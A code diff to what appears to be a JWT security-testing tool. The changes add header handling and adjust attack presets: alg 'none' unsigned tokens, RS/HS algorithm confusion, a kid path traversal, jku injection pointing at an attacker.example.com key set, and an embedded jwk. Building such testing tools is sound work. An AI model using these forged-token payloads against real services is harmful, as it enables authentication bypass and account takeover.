@@ -1,5 +1,5 @@
 const STRUCTURED_REQUEST_FIELDS = ['header', 'body', 'signature'];
-const SUPPORTED_HEADER_FIELDS = ['alg', 'typ', 'cty', 'kid', 'jku', 'jwk'];
+const SUPPORTED_HEADER_FIELDS = ['alg', 'typ', 'cty', 'kid', 'jku', 'jwk', 'crit'];
 const UNSUPPORTED_HEADER_FIELDS = ['x5u', 'x5c', 'x5t'];
 const METADATA_FIELDS = [
   'mode',
@@ -32,6 +32,15 @@ export function removeUndefinedFields(object) {
   return Object.fromEntries(
     Object.entries(object).filter(([, value]) => value !== undefined)
   );
+}
+
+export function buildJwtHeader(keyData, headerOverrides = {}) {
+  return removeUndefinedFields({
+    alg: keyData.alg,
+    typ: 'JWT',
+    kid: keyData.kid,
+    ...headerOverrides
+  });
 }
 
 function normalizeMode(mode) {
@@ -80,8 +89,21 @@ function normalizeHeader(requestData, structured) {
     throw new Error(`Unsupported JWT header field(s): ${unsupported.join(', ')}`);
   }
 
+  const criticalFields = header.crit;
+  if (criticalFields !== undefined) {
+    if (!Array.isArray(criticalFields) || !criticalFields.every(field => typeof field === 'string')) {
+      throw new Error('crit must be an array of header parameter names');
+    }
+
+    const missingCriticalFields = criticalFields.filter(field => !hasOwn(header, field));
+    if (missingCriticalFields.length > 0) {
+      throw new Error(`Missing critical JWT header field(s): ${missingCriticalFields.join(', ')}`);
+    }
+  }
+
   const unknown = Object.keys(header).filter(field =>
-    !SUPPORTED_HEADER_FIELDS.includes(field)
+    !SUPPORTED_HEADER_FIELDS.includes(field) &&
+    !(Array.isArray(criticalFields) && criticalFields.includes(field))
   );
   if (unknown.length > 0) {
     throw new Error(`Unsupported JWT header field(s): ${unknown.join(', ')}`);
@@ -150,8 +172,23 @@ export function normalizeTokenRequest(requestData = {}) {
   };
 }
 
+export function parseResponseType(responseType = 'token') {
+  const values = String(responseType)
+    .toLowerCase()
+    .trim()
+    .split(/\s+/)
+    .filter(Boolean);
+  const uniqueValues = new Set(values.length > 0 ? values : ['token']);
+
+  return {
+    shouldGenerateAccessToken: uniqueValues.has('token'),
+    shouldGenerateIdToken: uniqueValues.has('id_token')
+  };
+}
+
 function resolveAlgNoneVariant(normalized) {
-  const variant = normalized.options.algNoneVariant ?? normalized.header.alg ?? 'none';
+  const variant = normalized.options.algNoneVariant
+    ?? (normalized.header.alg?.toLowerCase?.() === 'none' ? normalized.header.alg : 'none');
   if (typeof variant !== 'string' || variant.toLowerCase() !== 'none') {
     throw new Error('alg_none_variant must be a case variation of "none"');
   }
@@ -165,19 +202,27 @@ export function applyVulnerabilityPreset(normalized, keyData) {
       return normalized;
     case 'alg_none':
       normalized.header.alg = resolveAlgNoneVariant(normalized);
-      normalized.signature = false;
+      if (normalized.signature === undefined) {
+        normalized.signature = false;
+      }
       return normalized;
     case 'rs_hs_confusion':
       normalized.header.alg = 'HS256';
       return normalized;
     case 'kid_traversal':
-      normalized.header.kid = '../../../../../../dev/null';
+      if (normalized.header.kid === undefined) {
+        normalized.header.kid = '../../../../../../dev/null';
+      }
       return normalized;
     case 'jku_injection':
-      normalized.header.jku = 'https://attacker.example.com/.well-known/jwks.json';
+      if (normalized.header.jku === undefined) {
+        normalized.header.jku = 'https://attacker.example.com/.well-known/jwks.json';
+      }
       return normalized;
     case 'embedded_jwk':
-      normalized.header.jwk = keyData.publicKey;
+      if (normalized.header.jwk === undefined) {
+        normalized.header.jwk = keyData.publicKey;
+      }
       return normalized;
     default:
       throw new Error(`Unsupported vulnerability mode: ${normalized.options.vulnerability}`);
